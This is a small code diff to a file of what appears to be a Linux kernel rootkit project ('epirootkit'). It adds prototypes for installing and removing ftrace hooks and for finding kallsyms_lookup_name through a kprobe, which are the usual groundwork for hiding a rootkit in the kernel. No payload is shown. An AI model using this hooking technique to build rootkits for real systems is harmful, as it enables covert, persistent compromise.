@@ -1,5 +1,12 @@
 #include "epirootkit.h"
 
+// Function prototypes
+unsigned long (*fh_init_kallsyms_lookup(void))(const char *);
+int fh_install_hook(struct ftrace_hook *hook);
+void fh_remove_hook(struct ftrace_hook *hook);
+int fh_install_hooks(struct ftrace_hook *hooks, size_t count);
+void fh_remove_hooks(struct ftrace_hook *hooks, size_t count);
+
 /**
  * @brief Retrieve the address of kallsyms_lookup_name via kprobe.
  *
